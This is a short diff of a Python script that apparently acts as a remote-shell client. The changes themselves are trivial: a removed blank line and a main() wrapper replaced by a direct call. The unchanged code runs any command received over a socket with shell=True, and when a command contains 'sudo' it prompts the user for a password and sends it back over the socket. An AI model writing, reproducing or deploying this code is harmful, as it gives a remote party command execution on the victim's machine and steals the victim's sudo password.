@@ -15,7 +15,6 @@ def connection():
 			client_socket.close()
 		elif "sudo" in received_data :
 			sudo_required()
-		
 		else :
 			command = subprocess.check_output(received_data, shell=True)
 			if not command:
@@ -28,6 +27,4 @@ def sudo_required():
 	password = getpass.getpass(prompt)
 	client_socket.send(str(password))
 
-def main():
-	connection()
-main()
+connection()
